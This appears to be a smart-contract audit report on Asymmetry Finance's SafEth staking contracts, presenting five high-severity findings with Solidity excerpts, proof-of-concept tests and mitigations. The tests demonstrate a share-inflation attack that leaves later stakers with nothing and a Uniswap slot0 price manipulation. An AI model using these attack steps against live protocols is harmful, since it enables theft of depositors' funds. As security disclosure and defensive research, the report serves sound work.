# Asymmetry Finance
The code under review can be found in [2023-03-asymmetry](https://github.com/code-423n4/2023-03-asymmetry).

## Findings Summary

| ID | Description | Severity |
| - | - | - |
| [H-01](#h-01-ethperderivative-might-be-inconsistent-for-reth-in-stake) | `ethPerDerivative()`  might be inconsistent for rETH in `stake()` | High |
| [H-02](#h-02-attacker-can-permanently-break-staking-when-safeths-totalsupply-is-small) | Attacker  can permanently break staking when SafETH's `totalSupply` is small | High |
| [H-03](#h-03-poolprice-is-vulnerable-to-price-manipulation) | `poolPrice()` is vulnerable to  price manipulation | High |
| [H-04](#h-04-staking-and-unstaking-dos-due-to-external-conditions) | Staking and unstaking DOS  due to external conditions | High |
| [H-05](#h-05-dangerous-assumption-of-steths-price) | Dangerous assumption of stETH's price  | High |

## [H-01] `ethPerDerivative()` might be inconsistent for rETH in `stake()`

### Impact

When staking, users might receive incorrect amounts of SafETH tokens, causing them to lose or unfairly gain ETH.

### Vulnerability Details

In the `Reth` contract, `ethPerDerivative()` is used to fetch the price of rETH in terms of ETH:

[Reth.sol#L206-L216](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L206-L216)
```solidity
/**
    @notice - Get price of derivative in terms of ETH
    @dev - we need to pass amount so that it gets price from the same source that it buys or mints the rEth
    @param _amount - amount to check for ETH price
*/
function ethPerDerivative(uint256 _amount) public view returns (uint256) {
    if (poolCanDeposit(_amount))
        return
            RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);
    else return (poolPrice() * 10 ** 18) / (10 ** 18);
}
```

For rETH specifically, `ethPerDerivative()` returns two possible prices:
* If `_amount` can be deposited, price is based of [`getEthValue(10 ** 18)`](https://github.com/rocket-pool/rocketpool/blob/master/contracts/contract/token/RocketTokenRETH.sol#L38-L48), the price of rETH in the rocket deposit pool.
* Otherwise, price is calculated using [`poolprice()`](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242), which is the price of rETH in the Uniswap liquidity pool.

To determine which price is returned, `poolCanDeposit()` is called, which has the following return statement:

[Reth.sol#L146-L149](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L146-L149)
```solidity
return
    rocketDepositPool.getBalance() + _amount <=
    rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&
    _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();
```

As seen from above, `poolCanDeposit()` checks if `_amount` can be deposited into [RocketDepositPool](https://github.com/rocket-pool/rocketpool/blob/master/contracts/contract/deposit/RocketDepositPool.sol). Therefore, if `_amount` can be deposited into rocket pool, `ethPerDerivative()` returns its price. Otherwise, Uniswap's price is returned.  

This becomes an issue in the `SafEth` contract. In the `stake()` function, `ethPerDerivative()` is first called when calculating the value held in each derivative contract:

[SafEth.sol#L70-L75](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L70-L75)
```solidity
// Getting underlying value in terms of ETH for each derivative
for (uint i = 0; i < derivativeCount; i++)
    underlyingValue +=
        (derivatives[i].ethPerDerivative(derivatives[i].balance()) *
            derivatives[i].balance()) /
        10 ** 18;
```

Afterwards, `stake()` uses the following logic to deposit ETH into each derivative contract: 

[SafEth.sol#L91-L95](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L91-L95)
```solidity
uint256 depositAmount = derivative.deposit{value: ethAmount}();
uint derivativeReceivedEthValue = (derivative.ethPerDerivative(
    depositAmount
) * depositAmount) / 10 ** 18;
totalStakeValueEth += derivativeReceivedEthValue;
```

The code above does the following:

1. `deposit()` is called for each derivative. For rETH, `ethAmount` is deposited into rocket pool if possible. 
2. `ethPerDerivative()` is called again to determine the amount of ETH deposited.

However, as the second call to `ethPerDerivative()` is after a deposit, it is possible for both calls to return different prices.

### Proof of Concept
Consider the following scenario:
- Rocket pool starts with the following:
  - `depositPoolBalance = 5000 ether`
  - `maximumDepositPoolSize = 5004 ether`
- Bob calls `stake()` to stake 10 ETH
  - As all three derivatives have equal weights, 3.33 ETH is allocated to the rETH derivative contract.
  - In the first call to `ethPerDerivative()`:
    - As `depositPoolBalance + 3.33 ETH` is less than `maximumDepositPoolSize`, `poolCanDeposit()` returns `true`.
    - Thus, `ethPerDerivative()` returns rocket pool's rETH price. 
  - 3.33 ETH is deposited into rocket pool:
    - `depositPoolBalance = 5000 ether + 3.3 ether = 5003.3 ether`.
  - In the second call to `ethPerDerivative()`:
    - Now, `depositPoolBalance + 3.33 ETH` is more than `maximumDepositPoolSize`, thus `poolCanDeposit()` returns `false`.
    - As such, `ethPerDerivative()` returns Uniswap's price instead.

In the scenario above, due to the difference in Rocket pool and Uniswap's prices, Bob will receive an incorrect amount of SafETH, causing him to unfairly gain or lose ETH.

The test below demonstrates how a user can gain more SafETH than normal due to the difference in prices:

```solidity
import { ethers, network } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { initialUpgradeableDeploy } from "./helpers/upgradeHelpers";
import { SafEth, RocketStorageInterface, RocketDAOProtocolSettingsDepositInterface } from "../typechain-types";
import { ROCKET_STORAGE_ADDRESS } from "./helpers/constants";
import { BigNumber } from "ethers";
import { expect } from "chai";

describe("stake(): Incorrect amount of safETH due to rETH", () => {
    let safETH: SafEth;
    let USER: SignerWithAddress;
    let rocketStorage: RocketStorageInterface;
    let rocketDAOProtocolSettingsDeposit: RocketDAOProtocolSettingsDepositInterface;

    const stakeAmount = ethers.utils.parseEther("10");
    
    // Function to get address from rocket storage
    const getRocketAddress = async (key: string) => {
        const data = ethers.utils.solidityKeccak256(["string", "string"], ["contract.address", key]);
        const address = await rocketStorage.getAddress(data);
        return address;
    };

    // Function to reset the state
    const resetToBlock = async (blockNumber: number) => {
        await network.provider.request({
            method: "hardhat_reset",
            params: [{
                    forking: {
                        jsonRpcUrl: process.env.MAINNET_URL,
                        blockNumber,
                    }
                }],
        });
    };

    // Function to set the value of rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize
    const setMaximumDepositPoolSize = async (v: BigNumber) => {
        const rocketDAOAddress = await getRocketAddress("rocketDAOProtocolProposals");
        const rocketDAOProtocolSettings = await ethers.getContractAt(
            "RocketDAOProtocolSettingsInterface", 
            rocketDAOProtocolSettingsDeposit.address
        );

        const rocketDAO = await ethers.getImpersonatedSigner(rocketDAOAddress);
        await network.provider.send("hardhat_setBalance", [rocketDAO.address, "0x1bc16d674ec80000"]);
        await rocketDAOProtocolSettings.connect(rocketDAO).setSettingUint("deposit.pool.maximum", v);
    };

    beforeEach(async () => {
        // Reset block
        const latestBlock = await ethers.provider.getBlock("latest");
        await resetToBlock(latestBlock.number);

        // Initialize accounts
        [USER,] = await ethers.getSigners()

        // Initialize safETH contract
        safETH = (await initialUpgradeableDeploy()) as SafEth;

        // Fetch rocket pool contracts
        rocketStorage = await ethers.getContractAt("RocketStorageInterface", ROCKET_STORAGE_ADDRESS);
        rocketDAOProtocolSettingsDeposit = await ethers.getContractAt(
            "RocketDAOProtocolSettingsDepositInterface",
            await getRocketAddress("rocketDAOProtocolSettingsDeposit")
        );

    });

    
    let normalAmount: BigNumber;
    it("balance way smaller MaximumDepositPoolSize", async () => {
        // Set maximum deposit pool size to 10,000 ether
        await setMaximumDepositPoolSize(ethers.utils.parseEther("10000"));

        // Stake 10 ether
        await safETH.connect(USER).stake({value: stakeAmount});
        
        // Store amount of safETH for comparison
        normalAmount = await safETH.balanceOf(USER.address); // 10000990329362121096
    })

    it("balance close to MaximumDepositPoolSize", async () => {
        // Make deposit pool will be maxed out after depositing 10 ether
        await setMaximumDepositPoolSize(ethers.utils.parseEther("5004"));

        // Stake 10 ether
        await safETH.connect(USER).stake({value: stakeAmount});

        // Received more safETH than supposed to
        const receivedAmount = await safETH.balanceOf(USER.address); // 10020876069348501487
        expect(receivedAmount).gt(normalAmount);       
    })
})
```

### Recommended Mitigation

Consider making the following changes to `stake()`:
- Before the deposit, store the results of `ethPerDerivative()` for each derivative. 
- After the deposit, use the stored values instead of calling `ethPerDerivative()` again.

## [H-02] Attacker can permanently break staking when SafETH's `totalSupply` is small

### Impact

An attacker can cause all subsequent stakers to not receive any SafETH tokens.

### Vulnerability Details

In the `SafEth` contract, whenever a user calls `stake()` to stake ETH, the following occurs:

[SafEth.sol#L70-L75](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L70-L75)

```solidity
// Getting underlying value in terms of ETH for each derivative
for (uint i = 0; i < derivativeCount; i++)
    underlyingValue +=
        (derivatives[i].ethPerDerivative(derivatives[i].balance()) *
            derivatives[i].balance()) /
        10 ** 18;
```

First, the total ETH value held by the protocol is calculated by multiplying the balance of each derivative contract with the derivative's `ethPerDerivative`. This underlying value is then used to determine the `preDepositPrice` of each SafETH token:

[SafEth.sol#L77-L81](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L77-L81)

```solidity
uint256 totalSupply = totalSupply();
uint256 preDepositPrice; // Price of safETH in regards to ETH
if (totalSupply == 0)
    preDepositPrice = 10 ** 18; // initializes with a price of 1
else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;
```

Afterwards, the amount of ETH staked is divided by `preDepositPrice` to determine the amount of SafETH tokens to be minted to the user:

[SafEth.sol#L97-L99](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L97-L99)

```solidity
// mintAmount represents a percentage of the total assets in the system
uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;
_mint(msg.sender, mintAmount);
```

However, the calculation above can be exploited when `totalSupply` is small:
- An attacker directly transfers a huge amount of derivative tokens to their respective derivative contracts. 
  - This causes `derivatives[i].balance()` to increase, therefore `underlyingValue` becomes extremely large.
  - As `totalSupply` is small, `preDepositPrice` becomes extremely large.
- Subsequently, if a user stakes a small amount of ETH:
  - `preDepositPrice` is larger than `totalSupplyValueEth * 10 ** 18`.
  - `mintAmount` becomes 0 due to Solidity's division rounding down.
  - User receives no SafETH shares, causing him to lose all his staked ETH.


### Proof of Concept

If `totalSupply` is 0, an early attacker can do the following:

- Attacker calls `stake()` with 0.5 ETH (minimum amount), gaining `5e17` SafETH tokens in return.
- Attacker calls `unstake()` with `_safEthAmount = 5e17 - 1`:
  - Only 1 SafETH token is left in the contract.
  - `totalSupply` of SafETH is now 1.
- Attacker transfers 200 WstETH to the WstETH derivative contract.

Now, if a user stakes a reasonable amount of ETH, such as 200 ETH (maximum amount):
- `underlyingValue = 223076696957989386803`
- `preDepositPrice = (10 ** 18 * 223076696957989386803) / 1 = 223076696957989386803000000000000000000`
- `mintAmount = (200e18 * 10 ** 18) / 223076696957989386803000000000000000000`, which rounds down to 0.

As such, the user receives no SafETH after staking. His staked ETH accrues to the attacker, who can withdraw all ETH in the protocol by unstaking his last SafETH token.

The following test demonstrates the scenario above:

```solidity
import { ethers } from "hardhat";
import { expect } from "chai";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { initialUpgradeableDeploy } from "./helpers/upgradeHelpers";
import { SafEth } from "../typechain-types";
import { WSTETH_ADRESS } from "./helpers/constants";
import ERC20 from "@openzeppelin/contracts/build/contracts/ERC20.json";

describe("Attacker can break minting when totalSupply is small", () => {
    let safETH: SafEth;
    let ATTACKER: SignerWithAddress;
    let USER: SignerWithAddress;

    before(async () => {
        // Initialize accounts
        [ATTACKER, USER,] = await ethers.getSigners() 

        // Initialize safETH contract
        safETH = (await initialUpgradeableDeploy()) as SafEth;
    });

    it("User doesn't gain safETH after staking", async () => {
        // ATTACKER deposits 250 ETH for wstETH
        const wstETH = new ethers.Contract(WSTETH_ADRESS, ERC20.abi);
        await ATTACKER.sendTransaction({
            to: wstETH.address,
            value: ethers.utils.parseEther("250")
        });

        // ATTACKER stakes minimum amount of ETH (0.5 ether)
        await safETH.connect(ATTACKER).stake({
            value: ethers.utils.parseEther("0.5"),
        });

        // ATTACKER unstakes most of his safETH and leaves 1 remaining
        let attackerSafETHBalance = await safETH.balanceOf(ATTACKER.address);
        await safETH.connect(ATTACKER).unstake(attackerSafETHBalance.sub(1));

        // totalSupply of safETH is now 1
        expect(await safETH.totalSupply()).eq(1);

        // ATTACKER transfers 200 wstETH to the wstETH derivative contract
        await wstETH.connect(ATTACKER).transfer(
            await safETH.derivatives(2), 
            ethers.utils.parseEther("200")
        );
        
        // USER stakes maximum amount of ETH (200 ether)
        await safETH.connect(USER).stake({
            value: ethers.utils.parseEther("200"),
        });

        // USER does not gain any safETH in return
        expect(await safETH.balanceOf(USER.address)).eq(0);
    })
})
```

### Recommended Mitigation 

Consider setting `preDepositPrice` as `10 ** 18` when `totalSupply` is extremely small:

[SafEth.sol#L79-L82](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L79-L82)
```diff
+       if (totalSupply < 1000) 
-       if (totalSupply == 0)
            preDepositPrice = 10 ** 18; // initializes with a price of 1
        else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;
```

Additionally, ensure the amount of SafETH to be minted is non-zero:

[SafEth.sol#L97-L99](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L97-L99)
```diff
        // mintAmount represents a percentage of the total assets in the system
        uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;
+       require(mintAmount != 0, "No SafETH minted");
        _mint(msg.sender, mintAmount);
```

## [H-03] `poolPrice()` is vulnerable to price manipulation

### Impact
The output of `poolPrice()`, which is used to determine the price of rETH, can be manipulated to become extremely small or large. An attacker abuse this to gain large amounts of SafETH during staking.

### Vulnerability Details

In the `Reth` contract, `poolPrice()` contains the following code: 

[Reth.sol#L228-L242](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242)
```solidity
 function poolPrice() private view returns (uint256) {
    address rocketTokenRETHAddress = RocketStorageInterface(
        ROCKET_STORAGE_ADDRESS
    ).getAddress(
            keccak256(
                abi.encodePacked("contract.address", "rocketTokenRETH")
            )
        );
    IUniswapV3Factory factory = IUniswapV3Factory(UNI_V3_FACTORY);
    IUniswapV3Pool pool = IUniswapV3Pool(
        factory.getPool(rocketTokenRETHAddress, W_ETH_ADDRESS, 500)
    );
    (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();
    return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2);
}
```

As seen above, `poolPrice()` calculates the price of `rETH` using `sqrtRatioX96`. 

However, this is unsafe as `slot0` is the most recent data point, and is extremely easy to manipulate. This makes `poolPrice()` vulnerable to price manipulation. 

As `poolPrice()` is used to determine the price of rETH during staking, an attacker can abuse this vulnerability to unfairly gain large amounts of SafETH when staking.

### Proof of Concept

Whem the rETH/WETH pool has low liquidity, an attacker can manipulate `sqrtPriceX96` to become extremely large by swapping a huge amount of WETH for rETH. In contrast, the attacker can also swap rETH for WETH to make `sqrtPriceX96` become extremely small.

The foundry test below demonstrates how `sqrtPriceX96` can be manipulated:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interfaces/IWETH.sol";
import "../src/interfaces/rocketpool/RocketTokenRETHInterface.sol";
import "../src/interfaces/uniswap/IUniswapV3Factory.sol";
import "../src/interfaces/uniswap/IUniswapV3Pool.sol";
import "../src/interfaces/uniswap/UniswapMath.sol";
import "../src/interfaces/uniswap/ISwapRouter.sol";

contract UniswapTest is Test {
    
    address public constant UNISWAP_POOL_ADDRESS = 0xa4e0faA58465A2D369aa21B3e42d43374c6F9613;
    address public constant RETH_ADDRESS = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address public constant W_ETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_ROUTER = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address public constant UNI_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    address public constant ATTACKER = address(0x1337);

    RocketTokenRETHInterface public RETH;
    IWETH public WETH;
    IUniswapV3Pool public uniswapPool;

    function setUp() public {
        RETH = RocketTokenRETHInterface(RETH_ADDRESS); 
        WETH = IWETH(W_ETH_ADDRESS);
        uniswapPool = IUniswapV3Pool(UNISWAP_POOL_ADDRESS);
    }

    function poolPrice() private view returns (uint256) {
        IUniswapV3Factory factory = IUniswapV3Factory(UNI_V3_FACTORY);
        IUniswapV3Pool pool = IUniswapV3Pool(
            factory.getPool(RETH_ADDRESS, W_ETH_ADDRESS, 500)
        );
        (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();
        return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2);
    }

    function testPoolPrice() public {
        // Attacker takes out flash loan and gets 5000 WETH
        deal(address(WETH), ATTACKER, 5000 ether);

        vm.startPrank(ATTACKER);

        // Get price of sqrtPriceX96 before the swap
        (uint160 sqrtPriceX96, , , , , , ) = uniswapPool.slot0();
        console.log("sqrtPriceX96 before:", sqrtPriceX96);

        // Attacker swaps WETH for rETH
        WETH.approve(UNISWAP_ROUTER, 5000 ether);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: address(WETH),
                tokenOut: address(RETH),
                fee: 500,
                recipient: address(this),
                amountIn: 5000 ether,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: UniswapMath.getSqrtRatioAtTick(UniswapMath.MAX_TICK - 1)
            });
        ISwapRouter(UNISWAP_ROUTER).exactInputSingle(params);

        // Price of sqrtPriceX96 changes drastically
        (sqrtPriceX96, , , , , , ) = uniswapPool.slot0();
        console.log("sqrtPriceX96 after:", sqrtPriceX96);
    }
}
```

## [H-04] Staking and unstaking DOS due to external conditions

_Note: This finding was split into 1 H, 2 M during judging_

### Impact

`stake()` and `unstake()` might permanently revert for a prolonged period of time.

### Vulnerability Details

In the `SafETH` contract, `stake()` calls `deposit()` for each derivative in a loop:

[SafEth.sol#L84-L96](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L84-L96)
```solidity
for (uint i = 0; i < derivativeCount; i++) {
    // Some code here...
    
    uint256 depositAmount = derivative.deposit{value: ethAmount}();
    
    // Some code here...
}
```

Likewise, `unstake()` calls `withdraw()` for each derivative in a loop:

[SafEth.sol#L113-L119](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L113-L119)
```solidity
for (uint256 i = 0; i < derivativeCount; i++) {
    // Some code here...

    derivatives[i].withdraw(derivativeAmount);
}
```

As such, if `deposit()` or `withdraw()` reverts for any derivative, `stake()` and `unstake()` will fail. 

This could cause `stake()` and `unstake()` to permanently revert for an prolonged period of time, as it is possible for `deposit()` and `withdraw()` to revert due to unchecked external conditions:
- Reth
  - [The rocket pool DAO can disable deposits](https://github.com/rocket-pool/rocketpool/blob/master/contracts/contract/deposit/RocketDepositPool.sol#L77).
  - [Withdrawals will fail if rocket pool does not have sufficient ETH](https://github.com/rocket-pool/rocketpool/blob/master/contracts/contract/token/RocketTokenRETH.sol#L110-L114).
- WstETH
  - stETH has a [daily staking limit](https://docs.lido.fi/guides/steth-integration-guide/#staking-rate-limits), which could cause deposits to fail.

If any of the external conditions above occurs, their respecitve function will be DOSed.

Although an owner can prevent this by setting the affected derivative's weight to 0, this is not a sufficient mitigation as:
1. This affects the ETH distribution for each derivative, potentially making it unbalanced.
2. If the DOS is over a short period of time but occurs repeatedly, such as stETH's staking limit, the owner will have to keep adjusting the affected derivative's weight.

### Proof of Concept

The test below demonstrates how the 150,000 staking limit for stETH could cause `stake()` to revert:

```js
import { ethers, network } from "hardhat";
import { expect } from "chai";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { initialUpgradeableDeploy } from "./helpers/upgradeHelpers";
import { SafEth } from "../typechain-types";
import { WSTETH_ADRESS } from "./helpers/constants";

describe("stake() might fail due to external conditions", () => {
    let safETH: SafEth;
    let USER: SignerWithAddress;

    before(async () => {
        // Initialize accounts
        [USER,] = await ethers.getSigners() 
        await network.provider.send("hardhat_setBalance", [USER.address, "0xf1e19e0c9bab24000000"]);

        // Initialize safETH contract
        safETH = (await initialUpgradeableDeploy()) as SafEth;
    });

    it("stETH staking limit causes stake() to revert", async () => {
        // Daily staking limit of 150,000 for stETH is reached
        const tx = USER.sendTransaction({
            to: WSTETH_ADRESS,
            value: ethers.utils.parseEther("150000"),
            data: "0x",
        });
        await tx;
        
        // USER stakes 80 ETH (26.7 ETH for WstETH), triggering the staking limit
        const tx2 = safETH.connect(USER).stake({
            value: ethers.utils.parseEther("80"),
        });

        // Call to stake() above should revert
        await expect(tx2).to.be.revertedWith("Failed to send Ether");
    })
})
```

### Recommended Mitigation

Check for the external conditions mentioned and handle them. For example, swap the staked ETH for derivatives through Uniswap in `deposit()`, and vice versa for `withdraw()`. 

## [H-05] Dangerous assumption of stETH's price

### Impact

In the `WstETH` contract, calculations assume that the price of stETH is the same as ETH (1 stETH = 1 ETH).

Although extremely unlikely, it is still possible for the price of stETH to deviate from ETH. If this occurs, calculations that involve the price of WstETH will be incorrect, potentially causing asset loss to users.

### Proof of Concept

`ethPerDerivative()` is used to determine the derivative's value in terms of ETH:

[WstEth.sol#L83-L88](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L83-L88)
```solidity
/**
    @notice - Get price of derivative in terms of ETH
    */
function ethPerDerivative(uint256 _amount) public view returns (uint256) {
    return IWStETH(WST_ETH).getStETHByWstETH(10 ** 18);
}
```

As `getStETHByWstETH()` converts WstETH to stETH, `ethPerDerivative()` returns the price of WstETH in terms of stETH instead. This might cause loss of assets to users as `ethPerDerivative()` is used in staking calculations.

This assumption also occurs in [`withdraw()`](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67):

[WstEth.sol#L58-L61](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L58-L61)
```solidity
uint256 stEthBal = IERC20(STETH_TOKEN).balanceOf(address(this));
IERC20(STETH_TOKEN).approve(LIDO_CRV_POOL, stEthBal);
uint256 minOut = (stEthBal * (10 ** 18 - maxSlippage)) / 10 ** 18;
IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut);
```

`minOut`, which represents the minimum ETH received, is calculated by subtracting slippage from the contract's stETH balance. If the price of stETH is low, the amount of ETH received from the swap, and subsequently sent to the user, might be less than intended. 

### Recommended Mitigation

Use a price oracle to approximate the rate for converting stETH to ETH.
